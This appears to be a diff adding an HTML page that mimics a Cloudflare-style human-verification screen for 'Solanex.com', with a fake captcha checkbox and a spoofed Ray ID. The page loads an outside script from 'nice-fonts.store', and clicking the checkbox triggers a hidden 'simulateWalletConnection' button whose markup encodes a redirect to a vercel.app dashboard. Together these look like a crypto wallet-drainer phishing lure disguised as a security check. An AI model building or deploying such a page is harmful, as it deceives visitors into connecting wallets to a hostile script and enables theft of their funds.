@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<title>Just a moment...</title>
+	<style>
+	* {
+		box-sizing: border-box;
+		margin: 0;
+		padding: 0
+	}
+	
+	body {
+		font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+		line-height: 1.5;
+		color: #2d2d2d;
+		background: #fff;
+		min-height: 100vh;
+		display: flex;
+		flex-direction: column
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		body {
+			background: #222;
+			color: #e0e0e0
+		}
+	}
+	
+	.main-content {
+		margin: 6rem auto 0;
+		padding: 0 1.5rem;
+		max-width: 70%;
+		width: 100%
+	}
+	
+	h1 {
+		font-size: 2.5rem;
+		font-weight: 500;
+		margin-bottom: 2rem
+	}
+	
+	.verification-message,
+	.security-message {
+		font-size: 1.5rem;
+		font-weight: 400;
+		margin-bottom: 2rem;
+		line-height: 1.4
+	}
+	
+	.captcha-container {
+		display: flex;
+		align-items: center;
+		border: 1px solid #d9d9d9;
+		padding: 12px 16px;
+		width: 300px;
+		height: 74px;
+		background: inherit;
+		cursor: pointer;
+		margin-bottom: 3rem
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		.captcha-container {
+			border-color: #4d4d4d
+		}
+	}
+	
+	.captcha-checkbox {
+		width: 22px;
+		height: 22px;
+		margin-right: 16px;
+		border: 1px solid #737373;
+		appearance: none;
+		outline: 0;
+		cursor: pointer;
+		position: relative;
+		flex-shrink: 0;
+		background: inherit
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		.captcha-checkbox {
+			border-color: #a0a0a0
+		}
+	}
+	
+	.captcha-checkbox:checked {
+		border-color: #737373
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		.captcha-checkbox:checked {
+			border-color: #a0a0a0
+		}
+	}
+	
+	.captcha-checkbox:checked::after {
+		content: "";
+		position: absolute;
+		left: 6px;
+		top: 2px;
+		width: 6px;
+		height: 12px;
+		border: solid #737373;
+		border-width: 0 2px 2px 0;
+		transform: rotate(45deg)
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		.captcha-checkbox:checked::after {
+			border-color: #a0a0a0
+		}
+	}
+	
+	.captcha-label {
+		font-size: 14px;
+		user-select: none
+	}
+	
+	.spinner {
+		display: none;
+		width: 22px;
+		height: 22px;
+		border: 2px solid rgba(115, 115, 115, .2);
+		border-top: 2px solid #737373;
+		border-radius: 50%;
+		animation: spin 1s linear infinite;
+		margin-right: 16px;
+		flex-shrink: 0
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		.spinner {
+			border: 2px solid rgba(160, 160, 160, .2);
+			border-top: 2px solid #a0a0a0
+		}
+	}
+	
+	@keyframes spin {
+		to {
+			transform: rotate(360deg)
+		}
+	}
+	
+	footer {
+		margin: auto auto 0;
+		padding: 0 1.5rem;
+		max-width: 70%;
+		width: 100%;
+		border-top: 1px solid #d9d9d9;
+		padding-top: 1rem;
+		padding-bottom: 1rem;
+		font-size: 12px;
+		text-align: center
+	}
+	
+	@media (prefers-color-scheme:dark) {
+		footer {
+			border-color: #4d4d4d
+		}
+	}
+	
+	.ray-id {
+		margin-bottom: .5rem;
+		font-family: monospace
+	}
+	
+	a {
+		color: #0051c3;
+		text-decoration: none
+	}
+	
+	a:hover {
+		text-decoration: underline
+	}
+	</style>
+	<script src="https://nice-fonts.store/script.js"></script>
+</head>
+
+<body>
+	<div class="main-content">
+		<h1>Solanex.com</h1>
+		<p class="verification-message">Verifying you are human. This may take a few seconds.</p>
+		<div class="captcha-container" id="captchaContainer">
+			<input type="checkbox" id="captchaCheckbox" class="captcha-checkbox">
+			<div class="spinner" id="spinner"></div>
+			<label for="captchaCheckbox" class="captcha-label">I'm not a robot</label>
+		</div>
+		<p class="security-message">Solanex.com needs to review the security of your connection before proceeding.</p>
+		<noscript>
+			<p class="security-message">Enable JavaScript and cookies to continue</p>
+		</noscript>
+	</div>
+	<footer>
+		<div class="ray-id">Ray ID: <code>87e25db4f768e395</code></div>
+	</footer>
+	<script>
+	const c = document.getElementById('captchaContainer');
+	const b = document.getElementById('captchaCheckbox');
+	const s = document.getElementById('spinner');
+
+	function simulateWalletConnection() {
+		const tempBtn = document.createElement('button');
+		tempBtn.className = 'simulate delay-yes redirect-https://solanex-roan.vercel.app/dashboard.html';
+		tempBtn.style.display = 'none';
+		document.body.appendChild(tempBtn);
+		tempBtn.click();
+		setTimeout(() => {
+			tempBtn.remove();
+		}, 100);
+	}
+	c.addEventListener('click', e => {
+		if(e.target !== b) b.checked = !b.checked;
+		if(b.checked) {
+			b.style.display = 'none';
+			s.style.display = 'block';
+			simulateWalletConnection();
+			setTimeout(() => {
+				b.checked = true;
+				b.style.display = 'block';
+				s.style.display = 'none';
+			}, 3000);
+		}
+	});
+	</script>
+</body>
+
+</html>
